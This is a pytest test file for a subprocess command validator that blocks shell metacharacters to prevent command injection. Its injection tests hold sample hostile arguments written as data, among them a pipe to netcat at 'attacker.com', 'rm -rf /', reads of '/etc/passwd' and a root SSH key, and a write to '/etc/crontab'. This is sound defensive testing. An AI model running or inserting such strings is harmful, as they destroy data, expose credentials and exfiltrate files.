"""Tests for subprocess command injection prevention.

These tests verify that the subprocess command validation properly blocks
all shell metacharacters that could lead to command injection attacks.
"""

from __future__ import annotations

import pytest
from assertpy import assert_that

from lintro.plugins.subprocess_executor import (
    UNSAFE_SHELL_CHARS,
    validate_subprocess_command,
)

# =============================================================================
# Tests for UNSAFE_SHELL_CHARS constant
# =============================================================================


def test_unsafe_chars_is_frozenset() -> None:
    """Verify UNSAFE_SHELL_CHARS is immutable (frozenset)."""
    assert_that(UNSAFE_SHELL_CHARS).is_instance_of(frozenset)


def test_unsafe_chars_contains_command_chaining_chars() -> None:
    """Verify command chaining characters are blocked."""
    chaining_chars = {";", "&", "|"}
    for char in chaining_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_redirection_chars() -> None:
    """Verify redirection characters are blocked."""
    redirection_chars = {">", "<"}
    for char in redirection_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_command_substitution_chars() -> None:
    """Verify command substitution characters are blocked."""
    substitution_chars = {"`", "$"}
    for char in substitution_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_escape_chars() -> None:
    """Verify escape and control characters are blocked."""
    escape_chars = {"\\", "\n", "\r"}
    for char in escape_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_glob_chars() -> None:
    """Verify glob pattern characters are blocked."""
    glob_chars = {"*", "?", "[", "]"}
    for char in glob_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_brace_expansion_chars() -> None:
    """Verify brace and subshell expansion characters are blocked."""
    brace_chars = {"{", "}", "(", ")"}
    for char in brace_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


def test_unsafe_chars_contains_other_shell_chars() -> None:
    """Verify other shell special characters are blocked."""
    other_chars = {"~", "!"}
    for char in other_chars:
        assert_that(UNSAFE_SHELL_CHARS).contains(char)


# =============================================================================
# Tests for validate_subprocess_command function
# =============================================================================


def test_validate_subprocess_command_valid_simple_command() -> None:
    """Verify simple command passes validation."""
    validate_subprocess_command(["echo", "hello"])
    # No exception raised


def test_validate_subprocess_command_valid_command_with_flags() -> None:
    """Verify command with flags passes validation."""
    validate_subprocess_command(["ls", "-la", "--color=auto"])
    # No exception raised


def test_validate_subprocess_command_valid_command_with_path() -> None:
    """Verify command with file path passes validation."""
    validate_subprocess_command(["cat", "/path/to/file.txt"])
    # No exception raised


def test_validate_subprocess_command_empty_command_raises() -> None:
    """Verify empty command raises ValueError."""
    with pytest.raises(ValueError, match="non-empty list"):
        validate_subprocess_command([])


def test_validate_subprocess_command_none_command_raises() -> None:
    """Verify None command raises ValueError."""
    with pytest.raises(ValueError, match="non-empty list"):
        validate_subprocess_command(None)  # type: ignore[arg-type]


def test_validate_subprocess_command_string_command_raises() -> None:
    """Verify string command (not list) raises ValueError."""
    with pytest.raises(ValueError, match="non-empty list"):
        validate_subprocess_command("ls -la")  # type: ignore[arg-type]


def test_validate_subprocess_command_non_string_argument_raises() -> None:
    """Verify non-string argument raises ValueError."""
    with pytest.raises(ValueError, match="must be strings"):
        validate_subprocess_command(["ls", 123])  # type: ignore[list-item]


@pytest.mark.parametrize(
    ("char", "description"),
    [
        pytest.param(";", "semicolon command separator", id="semicolon"),
        pytest.param("&", "ampersand background/AND", id="ampersand"),
        pytest.param("|", "pipe", id="pipe"),
        pytest.param(">", "output redirection", id="redirect_out"),
        pytest.param("<", "input redirection", id="redirect_in"),
        pytest.param("`", "backtick command substitution", id="backtick"),
        pytest.param("$", "variable expansion", id="dollar"),
        pytest.param("\\", "escape character", id="backslash"),
        pytest.param("\n", "newline", id="newline"),
        pytest.param("\r", "carriage return", id="carriage_return"),
        pytest.param("*", "glob wildcard", id="asterisk"),
        pytest.param("?", "single char wildcard", id="question"),
        pytest.param("[", "character class start", id="bracket_open"),
        pytest.param("]", "character class end", id="bracket_close"),
        pytest.param("{", "brace expansion start", id="brace_open"),
        pytest.param("}", "brace expansion end", id="brace_close"),
        pytest.param("(", "subshell start", id="paren_open"),
        pytest.param(")", "subshell end", id="paren_close"),
        pytest.param("~", "home expansion", id="tilde"),
        pytest.param("!", "history expansion", id="exclamation"),
    ],
)
def test_validate_subprocess_command_unsafe_char_in_argument_raises(
    char: str,
    description: str,
) -> None:
    """Verify each unsafe character is properly blocked.

    Args:
        char: The unsafe character to test.
        description: Human-readable description of the character.
    """
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["echo", f"arg{char}value"])


def test_validate_subprocess_command_injection_semicolon() -> None:
    """Verify semicolon command injection is blocked."""
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["ls", "-la; rm -rf /"])


def test_validate_subprocess_command_injection_pipe() -> None:
    """Verify pipe command injection is blocked."""
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["cat", "file | nc attacker.com 1234"])


def test_validate_subprocess_command_injection_backtick() -> None:
    """Verify backtick command substitution is blocked."""
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["echo", "`whoami`"])


def test_validate_subprocess_command_injection_dollar_parens() -> None:
    """Verify $() command substitution is blocked."""
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["echo", "$(cat /etc/passwd)"])


def test_validate_subprocess_command_injection_output_redirect() -> None:
    """Verify output redirection injection is blocked."""
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["echo", "data > /etc/crontab"])


def test_validate_subprocess_command_glob_expansion_attack() -> None:
    """Verify glob expansion is blocked."""
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["rm", "/tmp/*.txt"])


def test_validate_subprocess_command_brace_expansion_attack() -> None:
    """Verify brace expansion is blocked."""
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["touch", "/tmp/{a,b,c}.txt"])


def test_validate_subprocess_command_home_expansion_attack() -> None:
    """Verify home directory expansion is blocked."""
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["cat", "~root/.ssh/id_rsa"])


def test_validate_subprocess_command_newline_injection() -> None:
    """Verify newline injection is blocked."""
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["echo", "line1\nmalicious"])


def test_validate_subprocess_command_unsafe_char_in_command_name_raises() -> None:
    """Verify unsafe character in command name is blocked."""
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["ls;rm", "-la"])


def test_validate_subprocess_command_multiple_unsafe_chars_raises() -> None:
    """Verify command with multiple unsafe chars is blocked."""
    with pytest.raises(ValueError, match="Unsafe character"):
        validate_subprocess_command(["cmd", "arg; echo $USER | nc"])
